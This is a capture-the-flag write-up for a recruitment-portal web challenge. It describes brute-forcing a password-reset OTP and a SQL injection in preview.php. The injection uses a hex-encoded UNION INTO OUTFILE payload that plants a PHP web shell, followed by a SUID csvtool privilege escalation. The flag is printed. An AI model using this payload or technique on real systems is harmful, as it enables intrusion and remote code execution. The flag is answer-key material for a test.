# FU Career

## Description

FPTU Career has launched a new recruitment portal where candidates can register accounts, submit CVs, and track their application status online.

The HR department uses an internal dashboard to manage applicants and preview uploaded CVs before scheduling interviews. However, several features were rushed for the new recruitment season and may not have been thoroughly tested.

Goal: Escalate your privileges to admin and achieve Remote Code Execution (RCE).

Note: rockyou.txt will not be useful for this challenge.

## Solution Walkthrough

By looking at the source code, we can see that the flag consists of two parts: the first part is in `admin.php`, and the second part is in `part2.txt`.

Since the admin password could not be guessed, and `seed.php` revealed that the username is "admin", I went to `forgot.php` to reset the admin password, but it resulted in a username error.

I then noticed the contact information at the bottom; using `hr.fehn` worked successfully. Since the system allows multiple attempts, I brute-forced the OTP to reset the password, which allowed access to `admin.php` to retrieve the first part of the flag.

The second part can be found via an SQL injection vulnerability in `preview.php`.

```php
// Allows UNION-based SQL injection including INTO OUTFILE
$query = "SELECT * FROM cv_submissions WHERE id = $cv_id";
```

Therefore, by using `0 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e,'','','','','','','','' INTO OUTFILE '/var/www/html/uploads/webshell.php';--`, a webshell can be written to `/var/www/html/uploads/webshell.php`.

Finally, since the `Dockerfile` sets permissions such that root access is required to view the second part of the flag:

```dockerfile
RUN chmod u+s /usr/bin/csvtool     # SUID root
RUN chmod 0400 /part2.txt && chown root:root /part2.txt
```

I used `csvtool cat /part2.txt` to see the second part of the flag.

## Flag

```text
LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}
```
